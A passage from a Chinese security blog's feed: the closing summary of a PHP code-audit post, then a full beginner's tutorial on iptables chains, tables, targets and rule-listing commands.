src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200912183821.png" alt="image-20200912174743837"></p><h1 id="审计总结"><a href="#审计总结" class="headerlink" title="审计总结"></a>审计总结</h1><p>基本上是照搬照抄别人的思路来搞的，总比躺着玩手机强，也遇到了一些问题，比如Burp Suite 设置 域名和ip 绑定，phpstorm 调试分析，总之，能学到东西就行。学到了思路，下一步就是复现thinkphp 的历史漏洞，和thinkcmf 或者其他php框架的历史漏洞，学习完之后就去找cms进行实战！（其实这个已经搁置了快半年了。</p><blockquote><p>一个不能孜孜不倦，始终处于新知识、新技术学习状态下的安全爱好者，必然会被超越和取代。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;参考资料：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://v0w.top/2020/08/26/CodeAudit-php/&quot;&gt;代码审计常见的三种方法（PHP篇）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sqlsec.co</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="漏洞挖掘" scheme="https://hack-for.fun/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>iptables 学习</title>
    <link href="https://hack-for.fun/13bb2df2.html"/>
    <id>https://hack-for.fun/13bb2df2.html</id>
    <published>2020-08-26T07:17:09.000Z</published>
    <updated>2020-08-26T15:25:09.938Z</updated>
    
    <content type="html"><![CDATA[<p>参考资料： </p><p>(内容和图片)</p><p>全教程系列</p><p><a href="http://www.zsythink.net/archives/tag/iptables/">iptables 入门系列</a></p><blockquote><p>作为安全狗 ，自认为知道概念和基础操作就行了（搞安全的要学的东西真的太多了。</p></blockquote><p>原作者一开始讲了防火墙的知识，算不错的科普。</p><h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><blockquote><p>从逻辑上讲。防火墙可以大体分为主机防火墙和网络防火墙。</p></blockquote><p>主机防火墙：针对于单个主机进行防护。</p><p>网络防火墙：往往处于网络入口或边缘，针对于网络入口进行防护，服务于防火墙背后的本地局域网。</p><p>网络防火墙和主机防火墙并不冲突，可以理解为，网络防火墙主外（集体）， 主机防火墙主内（个人）。</p><hr><blockquote><p>从物理上讲，防火墙可以分为硬件防火墙和软件防火墙。</p></blockquote><p>硬件防火墙：在硬件级别实现部分防火墙功能，另一部分功能基于软件实现，性能高，成本高。</p><p>软件防火墙：应用软件处理逻辑运行于通用硬件平台之上的防火墙，性能低，成本低。</p><p>而渗透测试过程中，常常会遇见WAF，Web Application Firewall（Web 应用防火墙。比如长亭的雷池（SafeLine），基于语义分析，非常厉害，要是遇到了就别想怎么绕了（×</p><h1 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h1><p><code>iptables</code> 只有Linux 系的系统才有。</p><p><strong>iptables</strong>其实不是真正的防火墙，我们可以把它理解成一个客户端代理，用户通过iptables这个代理，将用户的安全设定执行到对应的”安全框架”中，这个”安全框架”才是真正的防火墙，这个框架的名字叫<strong>netfilter</strong></p><p>netfilter才是防火墙真正的安全框架（framework），netfilter位于内核空间。</p><p>iptables其实是一个命令行工具，位于用户空间，我们用这个工具操作真正的框架。</p><p>netfilter/iptables（下文中简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成<code>封包过滤</code>、<code>封包重定向</code>和<code>网络地址转换（NAT）</code>等功能。</p><p>Netfilter是Linux操作系统核心层内部的一个数据包处理模块，它具有如下功能：</p><ul><li><p>网络地址转换(Network Address Translate)</p></li><li><p>数据包内容修改</p></li><li><p>数据包过滤的防火墙功能</p></li></ul><p>所以说，虽然我们使用service iptables start启动iptables”服务”，但是其实准确的来说，iptables并<code>没有一个守护进程</code>，所以并不能算是真正意义上的服务，而应该算是<code>内核提供的功能</code>。</p><h2 id="Iptables-基础"><a href="#Iptables-基础" class="headerlink" title="Iptables 基础"></a>Iptables 基础</h2><p>Iptables 是按照“规则”办事的，规则其实就是网络管理员预定义的条件，规则一般的定义为<code>&quot;如果数据包头符合这样的条件，就这样处理这个数据包&quot;</code>。</p><blockquote><p>规则存储在内核空间的信息包过滤表中，这些规则分别指定了源地址、目的地址、传输协议（如TCP、UDP、ICMP）和服务类型（如HTTP、FTP和SMTP）等。当数据包与规则匹配时，iptables就根据规则所定义的方法来处理这些数据包，如放行（accept）、拒绝（reject）和丢弃（drop）等。配置防火墙的主要工作就是添加、修改和删除这些规则。</p></blockquote><p>当客户端访问服务器的web服务时，客户端发送报文到网卡，而<strong>tcp/ip协议栈是属于内核的一部分</strong>，所以，客户端的信息会通过内核的TCP协议传输到用户空间中的web服务中，而此时，客户端报文的目标终点为web服务所监听的套接字（IP：Port）上，当web服务需要响应客户端请求时，web服务发出的响应报文的目标终点则为客户端，这个时候，web服务所监听的IP与端口反而变成了原点，我们说过，netfilter才是真正的防火墙，它是内核的一部分，所以，如果我们想要防火墙能够达到”防火”的目的，则需要在内核中设置关卡，所有进出的报文都要通过这些关卡，经过检查后，符合放行条件的才能放行，符合阻拦条件的则需要被阻止，于是，就出现了input关卡和output关卡，<strong>而这些关卡在iptables中不被称为”关卡”,而被称为”链”。</strong></p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_1.png"></p><p>上面描述的场景并不完善，因为<strong>客户端发来的报文访问的目标地址可能并不是本机，而是其他服务器，当本机的内核支持IP_FORWARD时，我们可以将报文转发给其他服务器</strong>，所以，这个时候，我们就会提到iptables中的其他”关卡”，也就是其他”链”，他们就是  “路由前”、”转发”、”路由后”，他们的英文名是</p><p>PREROUTING、FORWARD、POSTROUTING</p><p>根据实际情况的不同，报文经过”链”可能不同。<strong>如果报文需要转发，那么报文则不会经过input链发往用户空间，而是直接在内核空间中经过forward链和postrouting链转发出去的。</strong></p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_2.png"></p><p>常见场景中报文的流向：</p><ul><li><p>到本机某进程的报文：PREROUTING –&gt; INPUT</p></li><li><p>由本机转发的报文：PREROUTING –&gt; FORWARD –&gt; POSTROUTING</p></li><li><p>由本机的某进程发出报文（通常为响应报文）：OUTPUT –&gt; POSTROUTING</p></li></ul><h2 id="链的概念"><a href="#链的概念" class="headerlink" title="链的概念"></a>链的概念</h2><p>为什么“关卡” 在 iptables 中被称做“链：</p><p>防火墙的作用就在于对经过报文匹配“规则”，然后执行相对应的“动作”。然而关卡上不只只有一条规则，而且有很多条规则，当我们把这些规则串到一个链条上的时候，就形成了”链”。</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_3.png"></p><p>每个经过这个”关卡”的报文，都要将这条”链”上的所有规则匹配一遍，如果有符合条件的规则，则执行规则对应的动作。</p><h2 id="表的概念"><a href="#表的概念" class="headerlink" title="表的概念"></a>表的概念</h2><blockquote><p>我们再想想另外一个问题，我们对每个”链”上都放置了一串规则，但是这些规则有些很相似，比如，A类规则都是对IP或者端口的过滤，B类规则是修改报文，那么这个时候，我们是不是能<strong>把实现相同功能的规则放在一起</strong>呢，必须能的。</p></blockquote><p>把具有相同功能的规则的集合叫做”表”，所以说，不同功能的规则，我们可以放置在不同的表中进行管理，而iptables已经为我们定义了4种表，每种表对应了不同的功能，而我们定义的规则也都逃脱不了这4种功能的范围，所以，学习iptables之前，我们必须先搞明白每种表 的作用。</p><p>iptables为我们提供了如下规则的分类，或者说，iptables为我们提供了如下”表”</p><ul><li><p>filter表：负责过滤功能，防火墙；内核模块：iptables_filter</p></li><li><p>nat表：network address translation，网络地址转换功能；内核模块：iptable_nat</p></li><li><p>mangle表：拆解报文，做出修改，并重新封装 的功能；iptable_mangle</p></li><li><p>raw表：关闭nat表上启用的连接追踪机制；iptable_raw</p></li></ul><p>也就是说，我们自定义的所有规则，都是这四种分类中的规则，或者说，所有规则都存在于这4张”表”中。</p><p></p><h2 id="表链关系"><a href="#表链关系" class="headerlink" title="表链关系"></a>表链关系</h2><blockquote><p>某些“链”中注定不会包含“某类规则”。</p></blockquote><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_4.png" alt="prerouting链上的规则存在的表情况"></p><blockquote><p>prerouting”链”只拥有nat表、raw表和mangle表所对应的功能，所以，prerouting中的规则只能存放于nat表、raw表和mangle表中</p></blockquote><p>PREROUTING    的规则可以存在于：raw表，mangle表，nat表。</p><p>INPUT      的规则可以存在于：mangle表，filter表，（centos7中还有nat表，centos6中没有）。</p><p>FORWARD     的规则可以存在于：mangle表，filter表。</p><p>OUTPUT     的规则可以存在于：raw表mangle表，nat表，filter表。</p><p>POSTROUTING    的规则可以存在于：mangle表，nat表。</p><p><strong>在实际的使用过程中，往往是通过”表”作为操作入口，对规则进行定义的</strong>，之所以按照上述过程介绍iptables，是因为从”关卡”的角度更容易从入门的角度理解，但是为了以便在实际使用的时候，更加顺畅的理解它们，此处我们还要将各”表”与”链”的关系罗列出来，</p><p>表（功能）&lt;–&gt;  链（钩子）：</p><p>raw   表中的规则可以被哪些链使用：PREROUTING，OUTPUT</p><p>mangle  表中的规则可以被哪些链使用：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING</p><p>nat   表中的规则可以被哪些链使用：PREROUTING，OUTPUT，POSTROUTING（centos7中还有INPUT，centos6中没有）</p><p>filter  表中的规则可以被哪些链使用：INPUT，FORWARD，OUTPUT</p><hr><p>其实我们还需要注意一点，因为数据包经过一个”链”的时候，会将当前链的所有规则都匹配一遍，但是匹配时总归要有顺序，我们应该一条一条的去匹配，而且我们说过，相同功能类型的规则会汇聚在一张”表”中，那么，哪些”表”中的规则会放在”链”的最前面执行呢，这时候就需要有一个优先级的问题，我们还拿prerouting”链”做图示。<br><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_5.png"></p><p>prerouting链中的规则存放于三张表中，而这三张表中的规则执行的优先级如下：</p><p>raw –&gt; mangle –&gt; nat</p><p>但是我们知道，<strong>iptables为我们定义了4张”表”,当他们处于同一条”链”时，执行的优先级如下。</strong></p><p>优先级次序（由高而低）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">raw --&gt; mangle --&gt; nat --&gt; filter</span><br></pre></td></tr></table></figure><p>前面说过，某些链天生就不能使用某些表中的规则，所以，<strong>4张表中的规则处于同一条链的目前只有output链</strong>，它就是传说中海陆空都能防守的关卡。</p><h2 id="数据经过防火墙的流程"><a href="#数据经过防火墙的流程" class="headerlink" title="数据经过防火墙的流程"></a>数据经过防火墙的流程</h2><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_6.png"></p><p>我们将经常用到的对应关系重新写在此处，方便对应图例查看。</p><p>链的规则存放于哪些表中（从链到表的对应关系）：</p><p>PREROUTING  的规则可以存在于：raw表，mangle表，nat表。</p><p>INPUT     的规则可以存在于：mangle表，filter表，（centos7中还有nat表，centos6中没有）。</p><p>FORWARD    的规则可以存在于：mangle表，filter表。</p><p>OUTPUT    的规则可以存在于：raw表mangle表，nat表，filter表。</p><p>POSTROUTING  的规则可以存在于：mangle表，nat表。</p><hr><p>表中的规则可以被哪些链使用（从表到链的对应关系）：</p><p>raw   表中的规则可以被哪些链使用：PREROUTING，OUTPUT</p><p>mangle  表中的规则可以被哪些链使用：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING</p><p>nat   表中的规则可以被哪些链使用：PREROUTING，OUTPUT，POSTROUTING（centos7中还有INPUT，centos6中没有）</p><p>filter  表中的规则可以被哪些链使用：INPUT，FORWARD，OUTPUT</p><p>下图中nat表在centos7中的情况就不再标明。</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_7.png"></p><h2 id="规则的概念"><a href="#规则的概念" class="headerlink" title="规则的概念"></a>规则的概念</h2><p>规则：根据指定的匹配条件来尝试匹配每个流经此处的报文，一旦匹配成功，则由规则后面指定的处理动作进行处理</p><p>规则由匹配条件和处理动作组成。</p><ul><li>匹配条件</li></ul><p>匹配条件分为基本匹配条件与扩展匹配条件</p><p><strong>基本匹配条件：</strong></p><p>源地址Source IP，目标地址 Destination IP</p><p>上述内容都可以作为基本匹配条件。</p><p><strong>扩展匹配条件：</strong></p><p>除了上述的条件可以用于匹配，还有很多其他的条件可以用于匹配，这些条件泛称为扩展条件，这些扩展条件其实也是netfilter中的一部分，只是以模块的形式存在，如果想要使用这些条件，则需要依赖对应的扩展模块。</p><p>源端口Source Port, 目标端口Destination Port</p><p>上述内容都可以作为扩展匹配条件</p><ul><li>处理动作</li></ul><p>处理动作在iptables中被称为target（这样说并不准确，我们暂且这样称呼），动作也可以分为基本动作和扩展动作。</p><p>此处列出一些常用的动作，之后的文章会对它们进行详细的示例与总结：</p><p><strong>ACCEPT</strong>：允许数据包通过。</p><p><strong>DROP</strong>：直接丢弃数据包，不给任何回应信息，这时候客户端会感觉自己的请求泥牛入海了，过了超时时间才会有反应。</p><p><strong>REJECT</strong>：拒绝数据包通过，必要时会给数据发送端一个响应的信息，客户端刚请求就会收到拒绝的信息。</p><p><strong>SNAT</strong>：源地址转换，解决内网用户用同一个公网地址上网的问题。</p><p><strong>MASQUERADE</strong>：是SNAT的一种特殊形式，适用于动态的、临时会变的ip上。</p><p><strong>DNAT</strong>：目标地址转换。</p><p><strong>REDIRECT</strong>：在本机做端口映射。</p><p><strong>LOG</strong>：在/var/log/messages文件中记录日志信息，然后将数据包传递给下一条规则，也就是说除了记录以外不对数据包做任何其他操作，仍然让下一条规则去匹配。</p><h1 id="iptables-实际操作之规则查询"><a href="#iptables-实际操作之规则查询" class="headerlink" title="iptables 实际操作之规则查询"></a>iptables 实际操作之规则查询</h1><p>iptables为我们预定义了4张表，它们分别是raw表、mangle表、nat表、filter表，不同的表拥有不同的功能。</p><p>filter负责过滤功能，比如允许哪些IP地址访问，拒绝哪些IP地址访问，允许访问哪些端口，禁止访问哪些端口，filter表会根据我们定义的规则进行过滤，filter表应该是我们最常用到的表了，所以此处，我们以filter表为例，开始学习怎样实际操作iptables。</p><ul><li>查看filter 表中的规则</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -L</span><br></pre></td></tr></table></figure><p>使用-t选项，指定要操作的表，使用-L选项，查看-t选项对应的表的规则，-L选项的意思是，列出规则，所以，上述命令的含义为列出filter表的所有规则</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200826222419.png" alt="image-20200826222325023"></p><p>从上图中可以看出，INPUT链、FORWARD链、OUTPUT链都拥有”过滤”的能力，所以，当我们要定义某条”过滤”的规则时，我们会在filter表中定义，但是具体在哪条”链”上定义规则呢？这取决于我们的工作场景。比如，<strong>我们需要禁止某个IP地址访问我们的主机，我们则需要在INPUT链上定义规则。因为，我们在理论总结中已经提到过，报文发往本机时，会经过PREROUTING链与INPUT链，如果我们想要禁止某些报文发往本机，我们只能在PREROUTING链和INPUT链中定义规则，但是PREROUTING链并不存在于filter表中，换句话说就是，PREROUTING关卡天生就没有过滤的能力，所以，我们只能在INPUT链中定义</strong>，当然，如果是其他工作场景，可能需要在FORWARD链或者OUTPUT链中定义过滤规则。</p><p>查询其他表中的规则：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iptables -t raw -L</span><br><span class="line"></span><br><span class="line">iptables -t mangle -L</span><br><span class="line"></span><br><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure><p>可以省略-t filter，当没有使用-t选项指定表时，默认为操作filter表，即iptables -L表示列出filter表中的所有规则。</p><ul><li>查询指定表中指定链的规则</li></ul><p>因为我的vps 没有配置iptables，所以图片就直接抄。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -L INPUT(注意大小写)</span><br><span class="line">查询更详细的数据可以使用-v 选项</span><br><span class="line">iptables -vL INPUT</span><br></pre></td></tr></table></figure><p><code>pkts bytes target     prot opt in     out     source               destination        </code></p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_3.png"></p><p><strong>pkts</strong>:对应规则匹配到的报文的个数。</p><p><strong>bytes</strong>:对应匹配到的报文包的大小总和。</p><p><strong>target</strong>:规则对应的target，往往表示规则对应的”动作”，即规则匹配成功后需要采取的措施。</p><p><strong>prot</strong>:表示规则对应的协议，是否只针对某些协议应用此规则。</p><p><strong>opt</strong>:表示规则对应的选项。</p><p><strong>in</strong>:表示数据包由哪个接口(网卡)流入，我们可以设置通过哪块网卡流入的报文需要匹配当前规则。</p><p><strong>out</strong>:表示数据包由哪个接口(网卡)流出，我们可以设置通过哪块网卡流出的报文需要匹配当前规则。</p><p><strong>source</strong>:表示规则对应的源头地址，可以是一个IP，也可以是一个网段。</p><p><strong>destination</strong>:表示规则对应的目标地址。可以是一个IP，也可以是一个网段。</p><p>上图中的源地址与目标地址都为anywhere，看来，iptables默认为我们进行了名称解析，但是在规则非常多的情况下如果进行名称解析，效率会比较低，所以，在没有此需求的情况下，我们可以<strong>使用-n选项，表示不对IP地址进行名称反解，直接显示IP地址</strong>，示例如下。</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -nvL</span><br></pre></td></tr></table></figure><p><img src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_4.png"></p><p>如上图所示，规则中的源地址与目标地址已经显示为IP，而非转换后的名称。</p><p>使用<code>--line-numbers</code> 即可显示规则的编号</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_5.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200826224157.png" alt="image-20200826224155655"></p><p>如图，每个链的后面都有一个括号，括号后面有一些信息：</p><p><strong>policy</strong>表示当前链的默认策略，policy ACCEPT表示上图中INPUT的链的默认动作为ACCEPT</p><p><strong>packets</strong>表示当前链（上例为INPUT链）默认策略匹配到的包的数量，0 packets表示默认策略匹配到0个包。</p><p><strong>bytes</strong>表示当前链默认策略匹配到的所有包的大小总和。</p><p>其实，我们可以把packets与bytes称作”计数器”，上图中的计数器记录了默认策略匹配到的报文数量与总大小，”计数器”只会在使用-v选项时，才会显示出来。</p><p>如果要查看更精确的计数值，可以使用<code>-x</code>选项。</p><h1 id="Iptables-规则管理"><a href="#Iptables-规则管理" class="headerlink" title="Iptables 规则管理"></a>Iptables 规则管理</h1><p><a href="http://www.zsythink.net/archives/1517">http://www.zsythink.net/archives/1517</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考资料： &lt;/p&gt;
&lt;p&gt;(内容和图片)&lt;/p&gt;
&lt;p&gt;全教程系列&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.zsythink.net/archives/tag/iptables/&quot;&gt;iptables 入门系列&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="运维知识" scheme="https://hack-for.fun/categories/%E8%BF%90%E7%BB%B4%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="iptables" scheme="https://hack-for.fun/tags/iptables/"/>
    
  </entry>
  
</feed>
